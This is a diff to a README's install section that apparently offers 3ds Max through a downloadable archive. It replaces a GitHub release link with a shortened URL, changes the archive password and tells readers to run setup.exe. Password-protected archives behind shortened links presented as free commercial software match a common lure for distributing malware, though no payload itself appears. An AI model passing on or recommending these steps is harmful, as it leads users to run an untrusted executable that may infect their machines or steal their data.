@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install</H3>
 
-- [Download](https://github.com/Benrice1243/3d-max/releases/download/Download/3dsMax.rar)
-- Open archive (password: max22)
+- [Download](https://goo.su/xmR3AsJ)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
